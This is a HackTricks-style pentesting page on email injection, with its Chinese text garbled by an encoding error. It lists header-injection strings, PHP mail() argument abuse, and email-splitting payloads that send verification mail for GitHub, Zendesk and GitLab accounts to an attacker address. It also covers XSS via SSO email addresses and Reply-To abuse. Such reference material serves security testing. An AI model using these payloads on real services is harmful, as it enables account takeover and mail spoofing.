<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Email Injections</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="email-injections"><a class="header" href="#email-injections">Email Injections</a></h1>
<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
ä½¿ç”¨ <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_content=email-injections"><strong>Trickest</strong></a> è½»æ¾æ„å»ºå’Œ <strong>è‡ªåŠ¨åŒ–å·¥ä½œæµ</strong>ï¼Œç”±ä¸–ç•Œä¸Š <strong>æœ€å…ˆè¿›</strong> çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚<br />
ä»Šå¤©è·å–è®¿é—®æƒé™ï¼š</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=email-injections" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a>** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**</li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="æ³¨å…¥å·²å‘é€çš„ç”µå­é‚®ä»¶"><a class="header" href="#æ³¨å…¥å·²å‘é€çš„ç”µå­é‚®ä»¶">æ³¨å…¥å·²å‘é€çš„ç”µå­é‚®ä»¶</a></h2>
<h3 id="åœ¨å‘ä»¶äººå‚æ•°åæ³¨å…¥-cc-å’Œ-bcc"><a class="header" href="#åœ¨å‘ä»¶äººå‚æ•°åæ³¨å…¥-cc-å’Œ-bcc">åœ¨å‘ä»¶äººå‚æ•°åæ³¨å…¥ Cc å’Œ Bcc</a></h3>
<pre><code>From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
</code></pre>
<p>æ¶ˆæ¯å°†å‘é€åˆ°æ”¶ä»¶äººå’Œæ”¶ä»¶äºº1è´¦æˆ·ã€‚</p>
<h3 id="æ³¨å…¥å‚æ•°"><a class="header" href="#æ³¨å…¥å‚æ•°">æ³¨å…¥å‚æ•°</a></h3>
<pre><code>From:sender@domain.com%0ATo:attacker@domain.com
</code></pre>
<p>æ¶ˆæ¯å°†å‘é€åˆ°åŸå§‹æ”¶ä»¶äººå’Œæ”»å‡»è€…è´¦æˆ·ã€‚</p>
<h3 id="æ³¨å…¥ä¸»é¢˜å‚æ•°"><a class="header" href="#æ³¨å…¥ä¸»é¢˜å‚æ•°">æ³¨å…¥ä¸»é¢˜å‚æ•°</a></h3>
<pre><code>From:sender@domain.com%0ASubject:This is%20Fake%20Subject
</code></pre>
<p>å‡ä¸»é¢˜å°†è¢«æ·»åŠ åˆ°åŸå§‹ä¸»é¢˜ä¸­ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å°†æ›¿æ¢å®ƒã€‚è¿™å–å†³äºé‚®ä»¶æœåŠ¡çš„è¡Œä¸ºã€‚</p>
<h3 id="æ›´æ”¹æ¶ˆæ¯çš„ä¸»ä½“"><a class="header" href="#æ›´æ”¹æ¶ˆæ¯çš„ä¸»ä½“">æ›´æ”¹æ¶ˆæ¯çš„ä¸»ä½“</a></h3>
<p>æ³¨å…¥ä¸€ä¸ªä¸¤è¡Œæ¢è¡Œç¬¦ï¼Œç„¶åå†™ä¸‹æ‚¨çš„æ¶ˆæ¯ä»¥æ›´æ”¹æ¶ˆæ¯çš„ä¸»ä½“ã€‚</p>
<pre><code>From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
</code></pre>
<h3 id="php-mail-å‡½æ•°åˆ©ç”¨"><a class="header" href="#php-mail-å‡½æ•°åˆ©ç”¨">PHP mail() å‡½æ•°åˆ©ç”¨</a></h3>
<pre><code class="language-bash"># The function has the following definition:

php --rf mail

Function [ &lt;internal:standard&gt; function mail ] {
- Parameters [5] {
Parameter #0 [ &lt;required&gt; $to ]
Parameter #1 [ &lt;required&gt; $subject ]
Parameter #2 [ &lt;required&gt; $message ]
Parameter #3 [ &lt;optional&gt; $additional_headers ]
Parameter #4 [ &lt;optional&gt; $additional_parameters ]
}
}
</code></pre>
<h4 id="ç¬¬äº”ä¸ªå‚æ•°-additional_parameters"><a class="header" href="#ç¬¬äº”ä¸ªå‚æ•°-additional_parameters">ç¬¬äº”ä¸ªå‚æ•° ($additional_parameters)</a></h4>
<p>æœ¬èŠ‚å°†åŸºäº<strong>å‡è®¾æ”»å‡»è€…æ§åˆ¶äº†æ­¤å‚æ•°çš„æƒ…å†µä¸‹å¦‚ä½•æ»¥ç”¨æ­¤å‚æ•°</strong>ã€‚</p>
<p>æ­¤å‚æ•°å°†è¢«æ·»åŠ åˆ° PHP ç”¨äºè°ƒç”¨äºŒè¿›åˆ¶ sendmail çš„å‘½ä»¤è¡Œä¸­ã€‚ç„¶è€Œï¼Œå®ƒå°†é€šè¿‡å‡½æ•° <code>escapeshellcmd($additional_parameters)</code> è¿›è¡Œæ¸…ç†ã€‚</p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥<strong>æ³¨å…¥ sendmail çš„æå–å‚æ•°</strong>ã€‚</p>
<h4 id="usrsbinsendmail-å®ç°çš„å·®å¼‚"><a class="header" href="#usrsbinsendmail-å®ç°çš„å·®å¼‚">/usr/sbin/sendmail å®ç°çš„å·®å¼‚</a></h4>
<p><strong>sendmail</strong> æ¥å£æ˜¯ç”±ç³»ç»Ÿä¸Šå®‰è£…çš„ MTA é‚®ä»¶è½¯ä»¶ï¼ˆSendmailã€Postfixã€Exim ç­‰ï¼‰æä¾›çš„ã€‚å°½ç®¡å‡ºäºå…¼å®¹æ€§åŸå› ï¼Œ<strong>åŸºæœ¬åŠŸèƒ½</strong>ï¼ˆå¦‚ -t -i -f å‚æ•°ï¼‰ä¿æŒ<strong>ç›¸åŒ</strong>ï¼Œä½†<strong>å…¶ä»–åŠŸèƒ½å’Œå‚æ•°</strong>æ ¹æ®å®‰è£…çš„ MTA æœ‰å¾ˆå¤§å·®å¼‚ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ sendmail å‘½ä»¤/æ¥å£çš„ä¸åŒæ‰‹å†Œé¡µçš„ä¸€äº›ç¤ºä¾‹ï¼š</p>
<ul>
<li>Sendmail MTA: http://www.sendmail.org/~ca/email/man/sendmail.html</li>
<li>Postfix MTA: http://www.postfix.org/mailq.1.html</li>
<li>Exim MTA: https://linux.die.net/man/8/eximReferences</li>
</ul>
<p>æ ¹æ®<strong>sendmail</strong> äºŒè¿›åˆ¶æ–‡ä»¶çš„æ¥æºï¼Œå‘ç°äº†ä¸åŒçš„é€‰é¡¹æ¥æ»¥ç”¨å®ƒä»¬å¹¶<strong>æ³„éœ²æ–‡ä»¶æˆ–ç”šè‡³æ‰§è¡Œä»»æ„å‘½ä»¤</strong>ã€‚è¯·æŸ¥çœ‹ <a href="https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html"><strong>https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html</strong></a></p>
<h2 id="åœ¨ç”µå­é‚®ä»¶åç§°ä¸­æ³¨å…¥"><a class="header" href="#åœ¨ç”µå­é‚®ä»¶åç§°ä¸­æ³¨å…¥">åœ¨ç”µå­é‚®ä»¶åç§°ä¸­æ³¨å…¥</a></h2>
<p>{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨è®¾æ³•åœ¨å…·æœ‰ä»»æ„åŸŸåçš„æœåŠ¡ä¸­åˆ›å»ºå¸æˆ·ï¼ˆå¦‚ Githubã€Gitlabã€CloudFlare Zero trust...ï¼‰å¹¶é€šè¿‡æ¥æ”¶éªŒè¯ç”µå­é‚®ä»¶éªŒè¯å®ƒï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿè®¿é—®å—å®³å…¬å¸æ•æ„Ÿä½ç½®
{% endhint %}</p>
<h3 id="è¢«å¿½ç•¥çš„ç”µå­é‚®ä»¶éƒ¨åˆ†"><a class="header" href="#è¢«å¿½ç•¥çš„ç”µå­é‚®ä»¶éƒ¨åˆ†">è¢«å¿½ç•¥çš„ç”µå­é‚®ä»¶éƒ¨åˆ†</a></h3>
<p>ç¬¦å·ï¼š<strong>+ã€-</strong> å’Œ <strong>{}</strong> åœ¨å°‘æ•°æƒ…å†µä¸‹å¯ä»¥ç”¨äºæ ‡è®°ï¼Œå¹¶è¢«å¤§å¤šæ•°ç”µå­é‚®ä»¶æœåŠ¡å™¨å¿½ç•¥</p>
<ul>
<li>ä¾‹å¦‚ john.doe+intigriti@example.com â†’ john.doe@example.com</li>
</ul>
<p><strong>æ‹¬å· () ä¸­çš„æ³¨é‡Š</strong> åœ¨å¼€å¤´æˆ–ç»“å°¾ä¹Ÿä¼šè¢«å¿½ç•¥</p>
<ul>
<li>ä¾‹å¦‚ john.doe(intigriti)@example.com â†’ john.doe@example.com</li>
</ul>
<h3 id="ç™½åå•ç»•è¿‡"><a class="header" href="#ç™½åå•ç»•è¿‡">ç™½åå•ç»•è¿‡</a></h3>
<figure><img src="../.gitbook/assets/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>
<h3 id="å¼•å·"><a class="header" href="#å¼•å·">å¼•å·</a></h3>
<figure><img src="../.gitbook/assets/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>
<h3 id="ip"><a class="header" href="#ip">IP</a></h3>
<p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨æ–¹æ‹¬å·ä¸­çš„ IP ä½œä¸ºåŸŸåï¼š</p>
<ul>
<li>john.doe@[127.0.0.1]</li>
<li>john.doe@[IPv6:2001:db8::1]</li>
</ul>
<h3 id="ç”µå­é‚®ä»¶ç¼–ç "><a class="header" href="#ç”µå­é‚®ä»¶ç¼–ç ">ç”µå­é‚®ä»¶ç¼–ç </a></h3>
<p>æ­£å¦‚åœ¨ <a href="https://portswigger.net/research/splitting-the-email-atom"><strong>è¿™é¡¹ç ”ç©¶</strong></a> ä¸­æ‰€è§£é‡Šçš„ï¼Œç”µå­é‚®ä»¶åç§°ä¹Ÿå¯ä»¥åŒ…å«ç¼–ç å­—ç¬¦ï¼š</p>
<ul>
<li><strong>PHP 256 æº¢å‡º</strong>ï¼šPHP <code>chr</code> å‡½æ•°å°†ç»§ç»­å‘å­—ç¬¦æ·»åŠ  256ï¼Œç›´åˆ°å®ƒå˜ä¸ºæ­£æ•°ï¼Œç„¶åæ‰§è¡Œæ“ä½œ <code>%256</code>ã€‚</li>
<li><code>String.fromCodePoint(0x10000 + 0x40) // ğ€ â†’ @</code></li>
</ul>
<p>{% hint style="success" %}
è¿™ä¸ªæŠ€å·§çš„ç›®çš„æ˜¯ä»¥ <code>RCPT TO:&lt;"collab@psres.net&gt;collab"@example.com&gt;</code> è¿™æ ·çš„æ³¨å…¥ç»“æŸ<br />
è¿™å°†æŠŠéªŒè¯ç”µå­é‚®ä»¶å‘é€åˆ°ä¸é¢„æœŸä¸åŒçš„ç”µå­é‚®ä»¶åœ°å€ï¼ˆå› æ­¤åœ¨ç”µå­é‚®ä»¶åç§°ä¸­å¼•å…¥å¦ä¸€ä¸ªç”µå­é‚®ä»¶åœ°å€å¹¶åœ¨å‘é€ç”µå­é‚®ä»¶æ—¶ç ´åè¯­æ³•ï¼‰
{% endhint %}</p>
<p>ä¸åŒçš„ç¼–ç ï¼š</p>
<pre><code class="language-bash"># Format
=? utf-8 ? q ? =41=42=43 ?= hi@example.com --&gt; ABChi@example.com

# =? -&gt; Start of encode
# utf-8 -&gt; encoding used
# ? -&gt; separator
# q -&gt; type of encoding
# ? -&gt; separator
# =41=42=43 -&gt; Hex encoded data
# ?= end of encoding

# Other encodings, same example:
#Â iso-8859-1
=?iso-8859-1?q?=61=62=63?=hi@example.com
# utf-8
=?utf-8?q?=61=62=63?=hi@example.com
# utf-7
=?utf-7?q?&lt;utf-7 encoded string&gt;?=hi@example.com
# q encoding + utf-7
=?utf-7?q?&amp;=41&lt;utf-7 encoded string without initial A&gt;?=hi@example.com
# base64
=?utf-8?b?QUJD?=hi@example.com
# bas64 + utf-7
=?utf-7?q?&lt;utf-7 encoded string in base64&gt;?=hi@example.com
#punycode
x@xn--svg/-9x6 â†’ x@&lt;svg/
</code></pre>
<p>Payloads:</p>
<ul>
<li>Github: <code>=?x?q?collab=40psres.net=3e=00?=foo@example.com</code></li>
<li>æ³¨æ„ç¼–ç çš„ <code>@</code> ä¸º =40ï¼Œç¼–ç çš„ <code>&gt;</code> ä¸º <code>=3e</code> å’Œ <code>null</code> ä¸º <code>=00</code> </li>
<li>å®ƒå°†æŠŠéªŒè¯é‚®ä»¶å‘é€åˆ° <code>collab@psres.net</code></li>
<li>Zendesk: <code>"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com</code></li>
<li>ä¸ä¹‹å‰ç›¸åŒçš„æŠ€å·§ï¼Œä½†åœ¨å¼€å¤´æ·»åŠ äº†ä¸€äº›å¸¸è§„å¼•å·ï¼Œå¹¶åœ¨ç¼–ç çš„ <code>@</code> ä¹‹å‰æ·»åŠ äº†ç¼–ç å¼•å· <code>=22</code>ï¼Œç„¶ååœ¨ä¸‹ä¸€ä¸ªç”µå­é‚®ä»¶ä¹‹å‰å¼€å§‹å’Œç»“æŸä¸€äº›å¼•å·ï¼Œä»¥ä¿®å¤ Zendesk å†…éƒ¨ä½¿ç”¨çš„è¯­æ³•</li>
<li>å®ƒå°†æŠŠéªŒè¯é‚®ä»¶å‘é€åˆ° <code>collab@psres.net</code></li>
<li>Gitlab: <code>=?x?q?collab=40psres.net_?=foo@example.com</code></li>
<li>æ³¨æ„ä½¿ç”¨ä¸‹åˆ’çº¿ä½œä¸ºåˆ†éš”åœ°å€çš„ç©ºæ ¼</li>
<li>å®ƒå°†æŠŠéªŒè¯é‚®ä»¶å‘é€åˆ° <code>collab@psres.net</code></li>
<li>Punycode: ä½¿ç”¨ Punycode å¯ä»¥åœ¨ Joomla ä¸­æ³¨å…¥æ ‡ç­¾ <code>&lt;style</code> å¹¶åˆ©ç”¨å®ƒé€šè¿‡ CSS å¤–æ³„çªƒå– CSRF ä»¤ç‰Œã€‚</li>
</ul>
<h4 id="tooling"><a class="header" href="#tooling">Tooling</a></h4>
<ul>
<li>æœ‰ä¸€ä¸ª <strong>Burp Suite Turbo Intruder è„šæœ¬</strong> ç”¨äºæ¨¡ç³Šè¿™äº›ç»„åˆï¼Œä»¥å°è¯•æ”»å‡»ç”µå­é‚®ä»¶æ ¼å¼ã€‚è¯¥è„šæœ¬å·²ç»åŒ…å«æ½œåœ¨çš„æœ‰æ•ˆç»„åˆã€‚</li>
<li>è¿˜å¯ä»¥ä½¿ç”¨ <a href="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100">Hackvertor</a> åˆ›å»ºç”µå­é‚®ä»¶æ‹†åˆ†æ”»å‡»</li>
</ul>
<h3 id="other-vulns"><a class="header" href="#other-vulns">Other vulns</a></h3>
<p><img src="../.gitbook/assets/image%20(1131).png" alt="https://www.youtube.com/watch?app=desktop&amp;v=4ZsTKvfP1g0" /></p>
<h2 id="ç¬¬ä¸‰æ–¹-sso"><a class="header" href="#ç¬¬ä¸‰æ–¹-sso">ç¬¬ä¸‰æ–¹ SSO</a></h2>
<h3 id="xss"><a class="header" href="#xss">XSS</a></h3>
<p>ä¸€äº›æœåŠ¡ï¼Œå¦‚ <strong>github</strong> æˆ– <strong>salesforce å…è®¸</strong> æ‚¨åˆ›å»ºä¸€ä¸ª <strong>å¸¦æœ‰ XSS æœ‰æ•ˆè´Ÿè½½çš„ç”µå­é‚®ä»¶åœ°å€</strong>ã€‚å¦‚æœæ‚¨å¯ä»¥ <strong>ä½¿ç”¨è¿™äº›æä¾›å•†ç™»å½•å…¶ä»–æœåŠ¡</strong>ï¼Œè€Œè¿™äº›æœåŠ¡ <strong>æ²¡æœ‰æ­£ç¡®æ¸…ç†</strong> ç”µå­é‚®ä»¶ï¼Œæ‚¨å¯èƒ½ä¼šå¯¼è‡´ <strong>XSS</strong>ã€‚</p>
<h3 id="è´¦æˆ·æ¥ç®¡"><a class="header" href="#è´¦æˆ·æ¥ç®¡">è´¦æˆ·æ¥ç®¡</a></h3>
<p>å¦‚æœ <strong>SSO æœåŠ¡</strong> å…è®¸æ‚¨ <strong>åˆ›å»ºä¸€ä¸ªä¸éªŒè¯ç»™å®šç”µå­é‚®ä»¶åœ°å€çš„è´¦æˆ·</strong>ï¼ˆå¦‚ <strong>salesforce</strong>ï¼‰ï¼Œç„¶åæ‚¨å¯ä»¥ä½¿ç”¨è¯¥è´¦æˆ· <strong>ç™»å½•åˆ°ä¸€ä¸ªä¿¡ä»»</strong> salesforce çš„ä¸åŒæœåŠ¡ï¼Œæ‚¨å¯èƒ½ä¼šè®¿é—®ä»»ä½•è´¦æˆ·ã€‚<br />
&amp;#xNAN;<em>Note that salesforce indicates if the given email was or not verified but so the application should take into account this info.</em></p>
<h2 id="å›å¤è‡³"><a class="header" href="#å›å¤è‡³">å›å¤è‡³</a></h2>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <em><strong>From: company.com</strong></em> å’Œ <em><strong>Replay-To: attacker.com</strong></em> å‘é€ç”µå­é‚®ä»¶ï¼Œå¦‚æœç”±äºç”µå­é‚®ä»¶æ˜¯ <strong>ä»</strong> å†…éƒ¨åœ°å€å‘é€çš„è€Œå‘é€äº†ä»»ä½• <strong>è‡ªåŠ¨å›å¤</strong>ï¼Œåˆ™ <strong>æ”»å‡»è€…</strong> å¯èƒ½èƒ½å¤Ÿ <strong>æ¥æ”¶</strong> è¯¥ <strong>å“åº”</strong>ã€‚</p>
<h2 id="ç¡¬é€€ä¿¡ç‡"><a class="header" href="#ç¡¬é€€ä¿¡ç‡">ç¡¬é€€ä¿¡ç‡</a></h2>
<p>æŸäº›æœåŠ¡ï¼Œå¦‚ AWSï¼Œå®æ–½äº†ä¸€ä¸ªç§°ä¸º <strong>ç¡¬é€€ä¿¡ç‡</strong> çš„é˜ˆå€¼ï¼Œé€šå¸¸è®¾ç½®ä¸º 10%ã€‚è¿™æ˜¯ä¸€ä¸ªå…³é”®æŒ‡æ ‡ï¼Œå°¤å…¶å¯¹äºç”µå­é‚®ä»¶æŠ•é€’æœåŠ¡ã€‚å½“è¶…è¿‡æ­¤æ¯”ç‡æ—¶ï¼ŒæœåŠ¡ï¼ˆå¦‚ AWS çš„ç”µå­é‚®ä»¶æœåŠ¡ï¼‰å¯èƒ½ä¼šè¢«æš‚åœæˆ–é˜»æ­¢ã€‚</p>
<p><strong>ç¡¬é€€ä¿¡</strong> æ˜¯æŒ‡ <strong>ç”µå­é‚®ä»¶</strong> è¢«é€€å›ç»™å‘ä»¶äººï¼Œå› ä¸ºæ”¶ä»¶äººçš„åœ°å€æ— æ•ˆæˆ–ä¸å­˜åœ¨ã€‚è¿™å¯èƒ½ç”±äºå¤šç§åŸå› å‘ç”Ÿï¼Œä¾‹å¦‚ <strong>ç”µå­é‚®ä»¶</strong> è¢«å‘é€åˆ°ä¸å­˜åœ¨çš„åœ°å€ã€ä¸€ä¸ªä¸çœŸå®çš„åŸŸï¼Œæˆ–æ”¶ä»¶æœåŠ¡å™¨æ‹’ç»æ¥å— <strong>ç”µå­é‚®ä»¶</strong>ã€‚</p>
<p>åœ¨ AWS çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œå¦‚æœæ‚¨å‘é€ 1000 å°ç”µå­é‚®ä»¶ï¼Œå…¶ä¸­ 100 å°å¯¼è‡´ç¡¬é€€ä¿¡ï¼ˆç”±äºæ— æ•ˆåœ°å€æˆ–åŸŸç­‰åŸå› ï¼‰ï¼Œè¿™å°†æ„å‘³ç€ 10% çš„ç¡¬é€€ä¿¡ç‡ã€‚è¾¾åˆ°æˆ–è¶…è¿‡æ­¤æ¯”ç‡å¯èƒ½ä¼šè§¦å‘ AWS SESï¼ˆç®€å•ç”µå­é‚®ä»¶æœåŠ¡ï¼‰é˜»æ­¢æˆ–æš‚åœæ‚¨çš„ç”µå­é‚®ä»¶å‘é€èƒ½åŠ›ã€‚</p>
<p>ä¿æŒä½ç¡¬é€€ä¿¡ç‡å¯¹äºç¡®ä¿ä¸é—´æ–­çš„ç”µå­é‚®ä»¶æœåŠ¡å’Œç»´æŠ¤å‘ä»¶äººå£°èª‰è‡³å…³é‡è¦ã€‚ç›‘æ§å’Œç®¡ç†æ‚¨çš„é‚®ä»¶åˆ—è¡¨ä¸­ç”µå­é‚®ä»¶åœ°å€çš„è´¨é‡å¯ä»¥æ˜¾è‘—å¸®åŠ©å®ç°è¿™ä¸€ç›®æ ‡ã€‚</p>
<p>æœ‰å…³æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œå¯ä»¥å‚è€ƒ AWS å…³äºå¤„ç†é€€ä¿¡å’ŒæŠ•è¯‰çš„å®˜æ–¹æ–‡æ¡£ <a href="https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types">AWS SES Bounce Handling</a>ã€‚</p>
<h2 id="å‚è€ƒ"><a class="header" href="#å‚è€ƒ">å‚è€ƒ</a></h2>
<ul>
<li><a href="https://resources.infosecinstitute.com/email-injection/">https://resources.infosecinstitute.com/email-injection/</a></li>
<li><a href="https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html">https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html</a></li>
<li><a href="https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view">https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view</a></li>
<li><a href="https://www.youtube.com/watch?app=desktop&amp;v=4ZsTKvfP1g0">https://www.youtube.com/watch?app=desktop&amp;v=4ZsTKvfP1g0</a></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
